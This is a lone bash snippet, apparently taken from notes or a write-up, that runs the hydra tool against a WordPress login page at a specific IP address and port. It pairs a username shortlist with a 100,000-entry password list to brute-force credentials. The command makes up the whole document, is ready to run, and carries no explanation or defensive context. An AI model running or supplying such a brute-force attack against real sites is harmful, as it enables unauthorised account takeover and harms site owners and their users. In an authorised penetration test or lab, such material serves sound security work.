 ```bash
 hydra \
 -L Documents/lists/top-usernames-shortlist.txt \
 -P Documents/lists/10-million-password-list-top-100000.txt \
 34.90.232.67 -s 8000 \
 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=correct:H=User-Agent\: Mozilla/5.0"
 ```
